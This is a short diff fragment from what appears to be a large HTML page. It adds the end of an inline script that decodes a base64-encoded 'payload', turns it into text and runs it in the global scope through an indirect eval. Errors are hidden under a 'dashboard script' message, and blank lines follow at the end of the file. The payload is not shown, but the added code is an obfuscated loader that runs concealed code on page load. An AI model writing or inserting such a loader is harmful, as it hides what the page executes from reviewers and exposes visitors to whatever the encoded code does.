@@ -2622,4 +2622,26 @@
                 var binary = atob(payload);
                 var bytes = new Uint8Array(binary.length);
                 for (var i = 0; i < binary.length; i++) {
-            
+                    bytes[i] = binary.charCodeAt(i);
+                }
+                var code = new TextDecoder('utf-8').decode(bytes);
+                // Execute code in the global scope
+                (0, eval)(code);
+            } catch(err) {
+                console.error("Error executing dashboard script:", err);
+            }
+        })();
+    </script>
+
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
